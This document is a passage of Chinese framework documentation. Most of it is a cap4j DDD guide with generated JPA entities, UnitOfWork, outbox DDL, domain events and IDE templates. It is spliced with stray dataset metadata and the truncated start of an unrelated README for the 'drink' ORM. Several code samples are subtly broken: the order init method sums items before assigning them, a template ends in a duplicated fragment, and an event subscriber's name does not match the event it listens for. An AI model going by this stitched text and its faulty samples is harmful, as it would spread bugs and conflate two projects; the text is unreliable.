 * 警告：请勿手工修改该文件的字段声明，重新生成会覆盖字段声明
 */
/* @AggregateRoot */
@Entity
@Table(name = ""`order`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class Order {

    // 【行为方法开始】



    // 【行为方法结束】



    // 【字段映射开始】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * 订单编号
     * varchar(100)
     */
    @Column(name = ""`order_no`"")
    String orderNo;

    /**
     * 订单状态
     * 0:INIT:待支付;-1:CLOSED:已关闭;1:PAID:已支付
     * int unsigned
     */
    @Convert(converter = org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus.Converter.class)
    @Column(name = ""`order_status`"")
    org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus orderStatus;

    /**
     * 总金额
     * decimal(14,2)
     */
    @Column(name = ""`amount`"")
    java.math.BigDecimal amount;

    @OneToMany(cascade = { CascadeType.ALL }, fetch = FetchType.EAGER, orphanRemoval = true) @Fetch(FetchMode.SUBSELECT)
    @JoinColumn(name = ""`order_id`"", nullable = false)
    private java.util.List<org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem> orderItems;

    /**
     * 数据版本（支持乐观锁）
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // 【字段映射结束】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}

```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * 订单项
 *  
 *
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 * 警告：请勿手工修改该文件的字段声明，重新生成会覆盖字段声明
 */
@Entity
@Table(name = ""`order_item`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order_item` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class OrderItem {

    // 【行为方法开始】



    // 【行为方法结束】



    // 【字段映射开始】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * 名称
     * varchar(100)
     */
    @Column(name = ""`name`"")
    String name;

    /**
     * 单价
     * decimal(14,2)
     */
    @Column(name = ""`price`"")
    java.math.BigDecimal price;

    /**
     * 数量
     * int
     */
    @Column(name = ""`count`"")
    Integer count;

    /**
     * 数据版本（支持乐观锁）
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // 【字段映射结束】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}


```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.enums;

import lombok.Getter;

import javax.persistence.*;
import java.util.HashMap;
import java.util.Map;

/**
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 * 警告：请勿手工修改该文件，重新生成会覆盖该文件
 */
public enum OrderStatus {

    /**
     * 待支付
     */
    INIT(0, ""待支付""),
    /**
     * 已关闭
     */
    CLOSED(-1, ""已关闭""),
    /**
     * 已支付
     */
    PAID(1, ""已支付""),
;
    @Getter
    private int code;
    @Getter
    private String name;

    OrderStatus(Integer code, String name){
        this.code = code;
        this.name = name;
    }

    private static Map<Integer, OrderStatus> enums = null;
    public static OrderStatus valueOf(Integer code) {
        if(enums == null) {
            enums = new HashMap<>();
            for (OrderStatus val : OrderStatus.values()) {
                enums.put(val.code, val);
            }
        }
        if(enums.containsKey(code)){
            return enums.get(code);
        }
        throw new RuntimeException(""枚举类型OrderStatus枚举值转换异常，不存在的值"" + code);
    }

    /**
     * JPA转换器
     */
    public static class Converter implements AttributeConverter<OrderStatus, Integer>{
        @Override
        public Integer convertToDatabaseColumn(OrderStatus  val) {
            return val.code;
        }

        @Override
        public OrderStatus convertToEntityAttribute(Integer code) {
            return OrderStatus.valueOf(code);
        }
    }
}


```

```java
package org.netcorepal.cap4j.ddd.example.adapter.domain.repositories;

import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;

/**
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 */
public interface OrderRepository extends org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository<Order, Long> {
    // 【自定义代码开始】本段落之外代码由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @org.springframework.stereotype.Component
    public static class OrderJpaRepositoryAdapter extends org.netcorepal.cap4j.ddd.domain.repo.AbstractJpaRepository<Order, Long>
    {
        public OrderJpaRepositoryAdapter(org.springframework.data.jpa.repository.JpaSpecificationExecutor<Order> jpaSpecificationExecutor, org.springframework.data.jpa.repository.JpaRepository<Order, Long> jpaRepository) {
            super(jpaSpecificationExecutor, jpaRepository);
        }
    }

    // 【自定义代码结束】本段落之外代码由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}

```

##### UniOfWork模式
简单来说[UoW](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/june/the-unit-of-work-pattern-and-persistence-ignorance)实现了将当前线程上下文中所有实体的变更操作一并转化成对应的关系型数据库的持久化DML（insert、update、delete）的能力。缩短事务执行时间的同时，可以让我们将更多的精力放在业务逻辑实现和优化上。

UnitOfWork 常用接口
- `persist(Object entity)` 待持久化添加或更新
- `remove(Object entity)` 待持久化删除
- `save()` 以整体事务提交以上待持久化的变更(添加、更新或删除)

示例
```java
// 代码省略...
public class Order {

    // 【行为方法开始】

    /**
     * 下单初始化
     * @param items
     */
    public void init(List<OrderItem> items){
        this.orderNo = ""order-"" + System.currentTimeMillis();
        this.orderStatus = OrderStatus.INIT;
        BigDecimal amount = orderItems.stream()
                .map(i -> i.getPrice().multiply(BigDecimal.valueOf( i.getCount())))
                .reduce(BigDecimal.ZERO, (a,b) -> a.add(b));
        this.amount = amount;
        this.orderItems = items;
    }

    // 【行为方法结束】
    // 代码省略...
}
```

```java
package org.netcorepal.cap4j.ddd.example.application.commands;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.command.Command;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.UnitOfWork;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem;
import org.springframework.stereotype.Service;

import java.math.BigDecimal;
import java.util.List;
import java.util.stream.Collectors;


/**
 * 下单
 *
 * @date 2024/8/21
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class PlaceOrderCmd {

    @Schema(description = ""订单项列表"")
    List<Item> orderItems;


    @Schema(description = ""订单项"")
    public static class Item{

        @Schema(description = ""名称"")
        String name;

        @Schema(description = ""价格"")
        BigDecimal price;

        @Schema(description = ""数量"")
        Integer count;
    }

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<PlaceOrderCmd, String> {
        private final AggregateRepository<Order, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public String exec(PlaceOrderCmd cmd) {

            Order order = Order.builder().build();

            List<OrderItem> orderItems = cmd.orderItems.stream()
                    .map(i -> OrderItem.builder()
                            .name(i.name)
                            .price(i.price)
                            .count(i.count)
                            .build())
                    .collect(Collectors.toList());

            order.init(orderItems);

            unitOfWork.persist(order);
            unitOfWork.save();

            return order.getOrderNo();
        }
    }
}
```

##### 事件定义、订阅、发布
**创建发件箱表**

为了实现`Outbox`模式，cap4j需要在业务库中创建发件箱表。脚手架初始化后，项目内`resources/ddl.sql`包含完整的发件箱表建表语句
```sql
-- Create syntax for TABLE '__event'
CREATE TABLE `__event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT '事件uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT '服务',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件类型',
                           `data` text COMMENT '事件数据',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件数据类型',
                           `exception` text COMMENT '事件发送异常',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '过期时间',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT '分发状态',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次尝试时间',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT '下次尝试时间',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT '已尝试次数',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT '尝试次数',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='事件发件箱 support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;
-- Create syntax for TABLE '__achrived_event'
CREATE TABLE `__achrived_event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT '事件uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT '服务',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件类型',
                           `data` text COMMENT '事件数据',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件数据类型',
                           `exception` text COMMENT '事件发送异常',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '过期时间',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT '分发状态',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次尝试时间',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT '下次尝试时间',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT '已尝试次数',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT '尝试次数',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='事件发件箱存档 support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;

CREATE TABLE `__locker` (
                            `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                            `name` varchar(100) NOT NULL DEFAULT '' COMMENT '锁名称',
                            `pwd` varchar(100) NOT NULL DEFAULT '' COMMENT '锁密码',
                            `lock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT '锁获取时间',
                            `unlock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT '锁释放时间',
                            `version` bigint(20) unsigned NOT NULL DEFAULT '0',
                            `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                            `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP  COMMENT '更新时间',
                            PRIMARY KEY (`id`),
                            KEY `idx_db_created_at` (`db_created_at`),
                            KEY `idx_db_updated_at` (`db_updated_at`),
                            UNIQUE `uniq_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='锁 support by cap4j\n@I;';

```

**领域事件定义**

通常领域事件发布需配合`UnitOfWork`模式实现，这指的是领域事件的发布与聚合内实体属性状态变更的持久化是捆绑的（归属同一事务），所以更合理的做法是领域事件一般定义在领域层（`domain`)。

通过[`DomainEvent`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/annotation/DomainEvent.java)注解的类，cap4j将会识别成领域事件。
后续即可通过[`DefaultDomainEventSupervisor`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/impl/DefaultDomainEventSupervisor.java).`instance`.`attach`方法来向当前线程上线文附加领域事件。
一旦 [`UnitOfWork`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/repo/UnitOfWork.java).save() 顺利提交事务。则cap4j将会保障事件被提交到具体适配好的消息队列（比如当前cap4j实现的RocketMQ）中。

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.events;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.netcorepal.cap4j.ddd.domain.event.annotation.DomainEvent;

import java.math.BigDecimal;
import java.time.LocalDateTime;

/**
 * 下单领域事件
 *
 * @author bingking338
 */
@DomainEvent(
        persist = true
)
@Data
@AllArgsConstructor
@NoArgsConstructor
@Builder
public class OrderPlacedDomainEvent {
    /**
     * 订单号
     */
    String orderNo;
    /**
     * 订单金额
     */
    BigDecimal amount;
    /**
     * 下单时间
     */
    LocalDateTime orderTime;
}

```
> 注解属性详解
> - `value()` value字段非空，则事件会被识别为集成事件，意味着该事件将通过消息队列适配，通知到分布式系统中的其他服务进程。
> - `subscriber()` 集成事件订阅场景，必须定义该字段，通常该字段的值将会被适配的消息队列应用到消费分组配置中。
> - `persist()` 控制事件发布记录持久化。集成事件发布场景，该字段无意义。非集成事件发布场景（仅在本服务进程内部有订阅需求），可以通过`persist=true`控制事件进入发件箱表，并脱离事件发布上下文事务中。以避免订阅逻辑异常影响发布事务的完成。
> 
> 应用场景例子说明
> - `基于MQ发送方` DomainEvent(value=""event-name-used-for-mq-topic"")
> - `基于MQ订阅方` DomainEvent(subscriber=""consumer-group"")
> - `消费方与订阅方事务隔离` DomainEvent(persist=true)
> - `消费方与订阅方同一事务` DomainEvent
> 
> 关于领域事件与集成事件
> 
> 集成事件指会对系统内其他服务发布的领域事件。通常如果要区分领域事件和集成事件，那么领域事件一般指的是不需要对外发布的业务事件，仅在内部聚合之间应用。很多地方都不区分领域事件与集成事件，但是我认为这个区分是价值的。
>


**领域事件发布**

通常应在实体行为中，发布领域事件。

接口[DomainEventSupervisor.java](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/DomainEventSupervisor.java)
> `即时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity)
> 
> `延时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, Duration delay)
> 
> `定时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, LocalDateTime schedule)

```java
import org.netcorepal.cap4j.ddd.domain.event.impl.DefaultDomainEventSupervisor;


// 代码省略...
public class Order {
    // 代码省略...
    public class Order {

        // 【行为方法开始】

        /**
         * 下单初始化
         * @param items
         */
        public void init(List<OrderItem> items){
            // 代码省略...
            DefaultDomainEventSupervisor.instance.attach(OrderPlacedDomainEvent.builder()
                    .orderNo(this.orderNo)
                    .amount(this.amount)
                    .orderTime(LocalDateTime.now())
                    .build(), this);
        }

        // 【行为方法结束】
        // 代码省略...
    }
}
```

**领域事件订阅**

领域事件订阅定义在应用层（`application`），通常放置在 `${basePackage}.application.subscribers` 包中。

领域事件订阅支持Spring注解式声明订阅(监听)的方式。

```java

import org.springframework.context.event.EventListener;
import org.springframework.stereotype.Service;

@Service
public class OrderPlacedDomainEventSubscriber{
    @EventListener(DeliveryReceivedDomainEvent.class)
    public void onEvent(DeliveryReceivedDomainEvent event){
        // 事件处理逻辑
    }
}
```


#### 应用层
##### IDEA代码模板
`${basePackage}.application.commands`中的类模板

模板名称：`Command`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 命令描述
 * 
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<${NAME}, ${ReturnType}>{
        private final AggregateRepository<${Entity}, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public ${ReturnType} exec(${NAME} cmd) {
            
            return null;
        }
    }
}
```
`${basePackage}.application.queries`中的类模板

模板名称：`Query`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.Query;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Query<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public ${NAME}Dto exec(${NAME} param) {
            ${Entity} entity = repo.findOne(${Entity}Schema.specify(
                root -> root.id().eq(param.id)
            )).orElseThrow(() -> new KnownException(""不存在""));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

模板名称：`QueryList`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.ListQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements ListQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public List<${NAME}Dto> exec(${NAME} param) {
            List<${Entity}> list = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

模板名称：`QueryPage`
```java
#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.PageQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.JpaPageUtils;
import org.netcorepal.cap4j.ddd.share.PageData;
import org.netcorepal.cap4j.ddd.share.PageParam;
import org.springframework.data.domain.Page;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class ${NAME} extends PageParam {
    private Long id;

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements PageQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;
    
        @Override
        public PageData<${NAME}Dto> exec(${NAME} param) {
            Page<${Entity}> page = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ), JpaPageUtils.toSpringData(param));
    
            return JpaPageUtils.fromSpringData(page, p -> UserPageDto.builder()
                .id(p.getId())
                .build());
        }
    }
    
    @Data
    @Builder
    @AllArgsConstructor
    @NoArgsConstructor
    public static class ${NAME}Dto{
        private Long id;
    
    }
}
```


#### 适配层
##### IDEA LiveTemplate
`acmd` 适配mvc透出命令
```java

@Autowired
$Cmd$.Handler $cmd$Handler;

@Data
@NoArgsConstructor
public static class $Cmd$Request {
    // todo: 添加参数

    @Schema(description = ""参数说明"")
    String param;

    public DeductWalletCmd toCommand() {
        return $Cmd$.builder()
                .param(param)
                .build();
    }
}
@Schema(description = ""接口说明"")
@PostMapping(""/$cmd$"")
public ResponseData<$ReturnType$> $cmd$(@RequestBody @Valid $Cmd$Request request) {
    $ReturnType$ result = $cmd$Handler.exec(request.toCommand());
    return ResponseData.success(result);
}
```
> Edit Template Variables 技巧
>
> cmd参数的Expression可以填入decapitalize(Cmd)

`aqry` 适配mvc透出查询详情
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@GetMapping(""/$qry$"")
public ResponseData<$Qry$.$Qry$Dto> $qry$(@Valid $Qry$ param) {
        $Qry$.$Qry$Dto result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryl` 适配mvc透出查询列表
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@GetMapping(""/$qry$"")
public ResponseData<List<$Qry$.$Qry$Dto>> $qry$(@Valid $Qry$ param) {
        List<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryp` 适配mvc透出查询分页列表
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@PostMapping(""/$qry$"")
public ResponseData<PageData<$Qry$.$Qry$Dto>> $qry$(@RequestBody @Valid $Qry$ param) {
        PageData<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }esponseData.success(result);
        }
```
### have a nice trip!",1,10,4,9.0,"['order', 'order', 'partition', 'range', 'partition', 'value', 'less', 'partition', 'range', 'partition', 'value', 'less', 'idea', 'livetemplate', 'nice', 'trip']","['partition', 'order', 'range', 'value', 'less']",9.0,"[org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,7.0,1.0
kiryu1223/drink,master,"qq群：257911716

**最新最热版本:**![Maven Central Version](https://img.shields.io/maven-central/v/io.github.kiryu1223/drink-all)

## 如何引入

### 从零开始构建的场合

1. 引入maven并且进行配置

   ```xml
   <dependencies>
           <!--需要引入的依赖-->
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-core</artifactId>
               <version>${project.version}</version>
           </dependency>

           <!--需要用户自己提供一个日志实现-->
           <dependency>
               <groupId>ch.qos.logback</groupId>
               <artifactId>logback-classic</artifactId>
               <version>1.2.12</version>
           </dependency>

           <!--数据库-->
           <dependency>
               <groupId>com.mysql</groupId>
               <artifactId>mysql-connector-j</artifactId>
               <version>9.0.0</version>
           </dependency>

           <!--数据源-->
           <dependency>
               <groupId>com.zaxxer</groupId>
               <artifactId>HikariCP</artifactId>
               <version>4.0.3</version>
           </dependency>
   
            <dependency>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
                <version>1.18.34</version>
            </dependency>
   
       </dependencies>

       <build>
           <plugins>
               <plugin>
                   <groupId>org.apache.maven.plugins</groupId>
                   <artifactId>maven-compiler-plugin</artifactId>
                   <version>3.8.1</version>
                   <configuration>
                       <!--开启apt的指令-->
                       <compilerArgs>
                           <arg>-Xplugin:ExpressionTree</arg>
                       </compilerArgs>
                       <annotationProcessorPaths>
                           <!--apt路径配置-->
                           <path>
                               <groupId>io.github.kiryu1223</groupId>
                               <artifactId>drink-core</artifactId>
                               <version>${project.version}</version>
                           </path>
                           <!--你的剩余apt路径配置，假设你的项目中还依赖了lombok等apt的话-->
                           <path>
                               <groupId>org.projectlombok</groupId>
                               <artifactId>lombok</artifactId>
                               <version>1.18.34</version>
                           </path>
                       </annotationProcessorPaths>
                   </configuration>
               </plugin>
           </plugins>
       </build>
   ```
2. 配置完成后进入main

   ```java
   package io.github.kiryu1223;

   import com.zaxxer.hikari.HikariDataSource;
   import io.github.kiryu1223.drink.Drink;
   import io.github.kiryu1223.drink.api.client.DrinkClient;
   import io.github.kiryu1223.drink.transaction.DefaultTransactionManager;
   import io.github.kiryu1223.drink.transaction.TransactionManager;
   import io.github.kiryu1223.drink.core.dataSource.DataSourceManager;
   import io.github.kiryu1223.drink.core.dataSource.DefaultDataSourceManager;
   import io.github.kiryu1223.drink.core.session.DefaultSqlSessionFactory;
   import io.github.kiryu1223.drink.core.session.SqlSessionFactory;

   public class Main
   {
       public static void main(String[] args)
       {
           // 配置一个数据源
           HikariDataSource dataSource = new HikariDataSource();
           dataSource.setJdbcUrl(""jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true"");
           dataSource.setUsername(""root"");
           dataSource.setPassword(""root"");
           dataSource.setDriverClassName(""com.mysql.cj.jdbc.Driver"");

           // 获取一个DrinkClient对象，所有的CRUD都通过他完成
           DataSourceManager dataSourceManager = new DefaultDataSourceManager(dataSource);
           TransactionManager transactionManager = new DefaultTransactionManager(dataSourceManager);
           SqlSessionFactory sqlSessionFactory = new DefaultSqlSessionFactory(dataSourceManager, transactionManager);

           Option option = new Option();
           option.setPrintSql(true);

           DrinkClient client = Drink.bootStrap()
                   .setDbType(DbType.MySQL)
                   .setOption(option)
                   .setDataSourceManager(dataSourceManager)
                   .setTransactionManager(transactionManager)
                   .setSqlSessionFactory(sqlSessionFactory)
                   .build();
       }
   }
   ```

3. 启动！

### 使用SpringBoot

1. 引入starter并且开启apt

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-spring-boot-starter</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置yml
   ```yaml
   spring:
     output:
       ansi:
         enabled: always
     profiles:
       active: dev
     # 最低程度配置下只需要提供一个数据源
     dsName:
       type: com.zaxxer.hikari.HikariDataSource
       url: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
       username: root
       password: root
       driverClassName: com.mysql.cj.jdbc.Driver

   server:
     port: 8080

   # 不配置的情况下默认以database: mysql和print-sql: true模式运行
   #drink:
   #  database: mysql
   #  print-sql: true
   ```

3. 启动！

### 使用Solon

1. 引入插件并且开启apt

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-solon-plugin</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
